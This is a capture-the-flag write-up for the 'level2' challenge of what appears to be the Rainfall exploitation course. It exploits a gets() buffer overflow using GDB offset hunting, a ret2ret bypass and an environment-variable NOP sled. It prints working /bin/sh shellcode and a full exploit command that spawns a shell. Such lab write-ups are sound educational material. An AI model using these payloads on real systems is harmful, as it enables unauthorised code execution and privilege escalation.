# Level2

First step - testing the program

	$ ./level2
	a
	a

The program print the input

Start it in GDB

	(gdb)$ disas main
	Dump of assembler code for function main:
	   0x0804853f <+0>:		push   ebp
	   0x08048540 <+1>:		mov    ebp,esp
	   0x08048542 <+3>:		and    esp,0xfffffff0
	   0x08048545 <+6>:		call   0x80484d4 <p>
	   0x0804854a <+11>:	leave
	   0x0804854b <+12>:	ret
	End of assembler dump.

The main call a function "p"

	(gdb)$ disas p
	Dump of assembler code for function p:
	   0x080484d4 <+0>:		push   ebp
	   0x080484d5 <+1>:		mov    ebp,esp
	   0x080484d7 <+3>:		sub    esp,0x68
	   0x080484da <+6>:		mov    eax,ds:0x8049860
	   0x080484df <+11>:	mov    DWORD PTR [esp],eax
	   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
	   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
	   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
	   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
	   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
	   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
	   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
	   0x080484fb <+39>:	and    eax,0xb0000000
	   0x08048500 <+44>:	cmp    eax,0xb0000000
	   0x08048505 <+49>:	jne    0x8048527 <p+83>
	   0x08048507 <+51>:	mov    eax,0x8048620
	   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
	   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
	   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
	   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
	   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
	   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
	   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
	   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
	   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
	   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
	   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
	   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
	   0x0804853d <+105>:	leave
	   0x0804853e <+106>:	ret
	End of assembler dump.

We can see a `gets()` call. The function gets is dangerous because it's vulnerable to overflow as we can see on the man

**********************************

Let's check the size of the offset for overflow. We will use the gdb-peda pattern tool for do it faster

	gdb-peda$ pattern create 200 file
	Writing pattern of 200 chars to filename "file"

	gdb-peda$ run < file
	Starting program: /home/nico/42/rainfall/level2/Ressources/level2 < file
	AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

	Program received signal SIGSEGV, Segmentation fault.
	...
	EIP: 0x41414a41 ('AJAA')
	...
	Stopped reason: SIGSEGV
	0x41414a41 in ?? ()

	gdb-peda$ pattern search
	Registers contain pattern buffer:
	...
	EIP+0 found at offset: 80
	...

The offset for overwrite EIP is 80. Let's be sure

	$ python -c 'print "a"*80' > payload

	(gdb-peda)$ run < payload
	Starting program: /home/nico/42/rainfall/level2/Ressources/level2 < payload
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

	Program received signal SIGSEGV, Segmentation fault.
	...
	EIP: 0xf7e6fc0f (cmp    BYTE PTR [eax],dh)
	...
	Stopped reason: SIGSEGV
	0xf7e6fc0f in ?? () from /lib32/libc.so.6

Ok, EIP is not overwrite, add 4 bytes and we will overwrite it

	$ python -c 'print "a"*84' > payload

	(gdb-peda)$ run < payload
	Starting program: /home/nico/42/rainfall/level2/Ressources/level2 < payload
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

	Program received signal SIGSEGV, Segmentation fault.
	...
	EIP: 0x61616161 ('aaaa')
	...
	Stopped reason: SIGSEGV
	0x61616161 in ?? ()

Perfect. We have the size

**********************************

For the exploit, we can't overwrite and use a stack address, because there is a check in the code

This code check if the EIP address is an address on the stack. The program quit if we do it

	if ((check & 0xb0000000) == 0xb0000000) {
		printf("(%p)\n", check);
		exit(1);
	}

	0x080484fb <+39>:	and    eax,0xb0000000
	0x08048500 <+44>:	cmp    eax,0xb0000000
	0x08048505 <+49>:	jne    0x8048527 <p+83>

We can use an env variable to store the payload :

	python -c 'print "\x90"*1000+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'

For a proper way, we will execute gdb and the binary with

	env -i payload=$(python -c 'print payload') ./binary

This is a trick for bypass the address difference with GDB (it's not a real problem here because our big nopsled), and not write in the real environment

The shellcode is from http://shell-storm.org/shellcode/files/shellcode-219.php. Specialy made for gets() of scanf() exploit, because it's re-open stdin

Now we need to execute this payload using the ret2ret method because there is a check in the code

The Ret2Ret method is overwrite EIP with a ret instruction and put after the address we want. The ret instruction will pop the stack and take the second address. Usefull for bypass this check

We need one of the NOPs address in the env and the address of a ret instruction

Get the environment payload address

Put a breakpoint just before the last return

	(gdb)$ b *main+12
	Breakpoint 1 at 0x804854b

	(gdb)$ r
	Starting program: /home/nico/42/rainfall/level2/Ressources/level2
	...
	Breakpoint 1, 0x0804854b in main ()

Get the address of our env variable that contain the payload

	(gdb)$ x/200xs environ
	....
	0xbffffb9a:	 "exploit=\220\220\220\220\220\220\220\220\220\220\220\220"
	....

The address is "0xbffffb9a"

Get all the addresses and choose one in the nopsled

	(gdb)$ x/200xg 0xbffffb9a
	....
	0xbffffe5a:	0x9090909090909090	0x9090909090909090
	0xbffffe6a:	0x9090909090909090	0x9090909090909090
	0xbffffe7a:	0x9090909090909090	0x9090909090909090
	0xbffffe8a:	0x9090909090909090	0x9090909090909090
	0xbffffe9a:	0x9090909090909090	0x9090909090909090
	0xbffffeaa:	0x9090909090909090	0x9090909090909090
	0xbffffeba:	0x9090909090909090	0x9090909090909090
	0xbffffeca:	0x9090909090909090	0x9090909090909090
	0xbffffeda:	0x9090909090909090	0x9090909090909090
	0xbffffeea:	0x9090909090909090	0x9090909090909090
	0xbffffefa:	0x9090909090909090	0x9090909090909090
	0xbfffff0a:	0x9090909090909090	0x9090909090909090
	....

Let's choose "0xbffffeaa"

We have our environment payload address

Now, get the a ret address, we can take the main ret

	(gdb)$ disas main
	Dump of assembler code for function main:
	   0x0804853f <+0>:		push   %ebp
	   0x08048540 <+1>:		mov    %esp,%ebp
	   0x08048542 <+3>:		and    $0xfffffff0,%esp
	   0x08048545 <+6>:		call   0x80484d4 <p>
	   0x0804854a <+11>:	leave
	   0x0804854b <+12>:	ret
	End of assembler dump.


The address is "0x0804854b"

We can build the exploit. With 80 chars + the ret address for pop and get the env address + env address

	$ python -c 'print "a"*80+"\x4b\x85\x04\x08"+"\xaa\xfe\xff\xbf"' > /tmp/exploit

Try it!

	$ cat /tmp/exploit - | env -i exploit=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level2
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>aaaaaaaaaaaa>����
	whoami
	level3

We have a shell!

Script it for reproduice!
